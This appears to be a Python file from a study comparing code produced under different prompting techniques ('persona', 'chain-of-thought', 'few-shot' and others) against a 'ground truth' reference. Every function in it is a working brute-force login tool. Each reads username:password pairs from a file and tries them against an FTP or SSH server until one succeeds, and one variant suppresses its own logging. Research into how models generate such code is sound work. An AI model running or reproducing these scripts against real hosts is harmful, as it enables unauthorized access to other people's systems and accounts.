from ftplib import FTP
import ftplib
import socket
import ssl
import time
import paramiko

def ground_truth_code_bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        try:
            ftp = FTP(hostname)
            ftp.login(userName, passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass
    return (None, None)

def persona_bruteLogin(hostname, passwdFile):
	from paramiko import SSHClient
	import time
	ssh = SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	with open(passwdFile, 'r') as f:
		for line in f:
			username, password = line.strip().split(':')
			try:
				ssh.connect(hostname=hostname, username=username, password=password)
				return (username, password)
			except:
				pass
			time.sleep(1)
	ssh.close()
	return None

import paramiko, time
def template_bruteLogin(hostname, passwdFile):
        try:
            with open(passwdFile, 'r') as file:
                for line in file:
                    creds = line.strip().split(':')
                    if len(creds)!= 2:
                        print(f'Skipping invalid credentials line: {line.strip()}')
                        continue
                    userName, password = creds
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        ssh.connect(hostname=hostname, username=userName, password=password)
                        ssh.close()
                        time.sleep(1)
                        return (userName, password)
                    except paramiko.AuthenticationException:
                        print(f'Failed login attempt with {userName}:{password}')
                        time.sleep(1)
                        continue
                    except Exception as e:
                        print(f'An error occurred: {str(e)}')
                        continue
        except FileNotFoundError:
            print(f'Password file {passwdFile} not found')
        except Exception as e:
            print(f'An error occurred: {str(e)}')
        return None

def question_refinement_bruteLogin(hostname, username_password_file):
    import paramiko
    import re
    import time
    from paramiko import AutoAddPolicy
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    with open(username_password_file, 'r') as file:
        for line in file.readlines():
            username, password = line.strip().split(':')
            try:
                start_time = time.time()
                ssh_client.connect(hostname=hostname, username=username, password=password)
                return(f"Successful connection with {username}:{password} in {time.time() - start_time} seconds")
                ssh_client.close()
                break
            except paramiko.AuthenticationException:
                print(f"Failed connection with {username}:{password} in {time.time() - start_time} seconds")
            except Exception as e:
                print(f"An error occurred with {username}:{password} in {time.time() - start_time} seconds: {str(e)}")
            time.sleep(1)
            
def alternative_approaches_bruteLogin(hostname, passwdFile):
    import paramiko
    import time
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(passwdFile, 'r') as file:
            for line in file:
                creds = line.strip().split(':')
                if len(creds)!= 2:
                    print(f"Invalid credentials format: {line}")
                    continue
                userName, password = creds
                try:
                    ssh.connect(hostname=hostname, username=userName, password=password)
                    print(f"Successful login with {userName}:{password}")
                    return (userName, password)
                except paramiko.AuthenticationException:
                    print(f"Authentication failed for {userName}:{password}")
                    time.sleep(1)
                except Exception as e:
                    print(f"An error occurred: {e}")
                    time.sleep(1)
    except FileNotFoundError:
        return(f"File {passwdFile} not found.")
    except Exception as e:
        return(f"An error occurred: {e}")
    finally:
        ssh.close()
    return None

import paramiko
import time
def context_manager_bruteLogin(hostname, passwdFile):
    paramiko.util.log_to_file("/dev/null")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(passwdFile, 'r') as f:
            for line in f:
                creds = line.strip().split(':')
                if len(creds)!= 2:
                    continue
                userName, password = creds
                try:
                    ssh.connect(hostname=hostname, username=userName, password=password)
                    return (userName, password)
                except paramiko.AuthenticationException:
                    time.sleep(1)
    except FileNotFoundError:
        pass
    finally:
        ssh.close()
    return None

def flipped_interaction_3__bruteLogin(hostname, passwdFile):
    from ftplib import FTP
    import time

    userName = None
    password = None

    with open(passwdFile, 'r') as f:
        for line in f:
            credentials = line.strip().split(':')
            if len(credentials) != 2:
                continue
            credentials[1] = credentials[1].rstrip()
            try:
                ftp = FTP(hostname)
                ftp.login(credentials[0], credentials[1])
                userName = credentials[0]
                password = credentials[1]
                ftp.quit()
                return (userName, password)
            except:
                pass
            time.sleep(1)
    
    return None


def flipped_interaction_4__bruteLogin(hostname, passwdFile):
    from ftplib import FTP
    import time

    with open(passwdFile, 'r') as f:
        for line in f:
            [username, password] = line.strip().split(':')
            ftp = FTP()
            try:
                ftp.connect(hostname, timeout=20)
            except:
                continue
            try:
                ftp.login(user=username, passwd=password)
            except:
                ftp.close()
                time.sleep(1)
                continue
            ftp.close()
            return (username, password)
            time.sleep(1)
    
    return (None, None)


def flipped_interaction_5__bruteLogin(hostname, passwdFile, verbose=False):
    successful_combinations = []
    try:
        with open(passwdFile, 'r') as file:
            for line in file:
                line = line.strip()
                username, password = line.split(':')
                try:
                    ftp = ftplib.FTP(hostname)
                    ftp.login(user=username, passwd=password)
                    successful_combinations.append((username, password))
                    ftp.quit()
                    if verbose:
                        print(f"Successfully logged in with username '{username}' and password '{password}'")
                    time.sleep(1)
                except ftplib.all_errors as e:
                    if verbose:
                        print(f"Failed to log in with username '{username}' and password '{password}': {e}")
                    continue
    except FileNotFoundError:
        return(f"Error: The password file '{passwdFile}' was not found.")
    return successful_combinations

def iterative_prompting_3__bruteLogin(hostname, passwdFile):
    if not isinstance(hostname, str) or not isinstance(passwdFile, str):
        raise ValueError('Hostname and passwdFile must be strings')
    if not hostname or not passwdFile:
        raise ValueError('Hostname and passwdFile cannot be empty')
    paramiko.util.log_to_file('paramiko.log')
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.RejectPolicy())
    try:
        with open(passwdFile, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                try:
                    username, password = line.strip().split(':', 1)
                    if not username or not password:
                        continue
                    ssh.connect(hostname=hostname, username=username, password=password, timeout=3, banner_timeout=3, auth_timeout=3)
                    print(f'connected with {username}:{password}')
                    return username, password
                except paramiko.AuthenticationException:
                    continue
                except Exception as e:
                    print(str(e))
                finally:
                    time.sleep(1)
    except FileNotFoundError:
        return('Password file not found')
    except Exception as e:
        return(str(e))
        
def iterative_prompting_4__bruteLogin(hostname, passwdFile):
    if not isinstance(hostname, str) or not isinstance(passwdFile, str):
        raise TypeError('Hostname and password file must be strings.')
    if not hostname or not passwdFile:
        raise ValueError('Hostname and password file cannot be empty.')
    try:
        import importlib
        spec = importlib.util.find_spec('paramiko')
        if spec is None:
            raise ImportError('Paramiko library is not installed.')
    except ImportError:
        raise ImportError('Importlib library is not installed.')
    try:
        from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
    except AttributeError:
        raise NotImplementedError('paramiko library is outdated, upgrade to latest version.')
    except NameError:
        raise ImportError('paramiko library is not installed or not properly imported.')
    max_attempts = 100
    try:
        with open(passwdFile, 'r', encoding='utf-8') as file:
            for i, line in enumerate(file):
                if i >= max_attempts:
                    raise RuntimeError(f'Password file exceeds {max_attempts} attempts.')
                credentials = line.strip().split(':', 1)
                if len(credentials)!= 2:
                    continue
                user_name, password = credentials
                try:
                    ssh.connect(hostname=hostname, username=user_name, password=password, look_for_keys=False, allow_agent=False)
                    ssh.close()
                    import time
                    time.sleep(1)
                    return user_name, password
                except AuthenticationException as e:
                    import time
                    time.sleep(1)
                    if i == max_attempts - 1:
                        raise Exception(f'All {max_attempts} attempts failed: {e}')
                except SSHException as e:
                    raise SSHException(f'SSH error: {e}')
                except Exception as e:
                    raise Exception(f'Unknown error: {e}')
    except FileNotFoundError:
        raise FileNotFoundError(f'Password file not found: {passwdFile}')
    except Exception as e:
        raise Exception(f'Unknown error: {e}')
    return None

def iterative_prompting_5__bruteLogin(hostname, passwdFile):
    import paramiko

    if not isinstance(hostname, str) or not isinstance(passwdFile, str):
        raise TypeError('Hostname and passwdFile must be strings')
    if not passwdFile.endswith('.txt'):
        raise ValueError('Password file must be a .txt file')

    try:
        with open(passwdFile, 'r') as file:
            for line in file:
                line = line.strip()
                if ':' in line:
                    username, password = line.split(':', 1)
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.RejectPolicy())
                    try:
                        ssh.connect(hostname=hostname, username=username, password=password, timeout=3, look_for_keys=False)
                        ssh.close()
                        return (username, password)
                    except paramiko.AuthenticationException:
                        pass
    except Exception as e:
        raise Exception(f'An error occurred: {e}')
    
    return None

def few_shots_prompting_bruteLogin(hostname, passwdFile):
    import paramiko
    import time

    with open(passwdFile, 'r') as f:
        for line in f:
            userName, password = line.strip().split(':')
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                ssh.connect(hostname=hostname, username=userName, password=password)
                print('Login successful with username:' + userName + ' and password:' + password)
                ssh.close()
                return (userName, password)
            except paramiko.AuthenticationException:
                print('Login failed with username:' + userName + ' and password:' + password)
                time.sleep(1)

    return None


def cot_prompting_bruteLogin(hostname, passwdFile):
    with open(passwdFile, 'r') as f:
        for line in f:
            username, password = line.strip().split(':')
            try:
                ftp = ftplib.FTP(hostname)
                if ftp.login(username, password):
                    return (username, password)
                ftp.quit()
            except:
                pass
            time.sleep(1)
    return None

def fact_check_list_bruteLogin(hostname, passwdFile):
    if not hostname or not passwdFile:
        raise ValueError("Hostname and password file must not be empty")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(passwdFile, 'r') as file:
            for line in file:
                username, password = line.strip().split(':')
                try:
                    ssh.connect(hostname=hostname, username=username, password=password)
                    ssh.close()
                    return username, password
                except paramiko.AuthenticationException:
                    time.sleep(1)
    except FileNotFoundError:
        raise FileNotFoundError("Password file not found")
    raise Exception("No successful login found")

def not_interactive_mix_bruteLogin(hostname, passwdFile):

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(passwdFile, 'r') as f:
            for line in f:
                username, password = line.strip().split(':')
                try:
                    ssh_client.connect(hostname=hostname, username=username, password=password)
                    print(f'Login successful: {username}:{password}')
                    return (username, password)
                except paramiko.AuthenticationException:
                    print(f'Login failed for {username}:{password}')
                    time.sleep(1)
    except FileNotFoundError:
        return(f'The file {passwdFile} was not found.')
    except Exception as e:
        return(f'Error occurred: {e}')
    finally:
        ssh_client.close()

        
import ftplib
import time
import logging
def interactive_mix_bruteLogin(hostname, filepath, delay=1):
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    try:
        with open(filepath, 'r') as file:
            for line in file:
                username, password = line.strip().split(':')
                try:
                    ftp = ftplib.FTP(hostname)
                    ftp.login(username, password)
                    ftp.quit()
                    logging.info(f'Login successful with username {username} and password {password}')
                    return (username, password)
                except ftplib.error_perm:
                    logging.info(f'Login failed with username {username} and password {password}')
                finally:
                    time.sleep(delay)
    except FileNotFoundError:
        return(f'File {filepath} not found')
    except Exception as e:
        return(f'An error occurred: {str(e)}')
    
import paramiko
def baseline_bruteLogin(hostname, passwdFile):
    with open(passwdFile, 'r') as f:
        for line in f:
            creds = line.strip().split(':')
            if len(creds)!= 2:
                continue
            userName, password = creds
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname=hostname, username=userName, password=password, timeout=3)
                return (userName, password)
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                return(f"Error: {e}")
            finally:
                ssh.close()
            import time
            time.sleep(1)
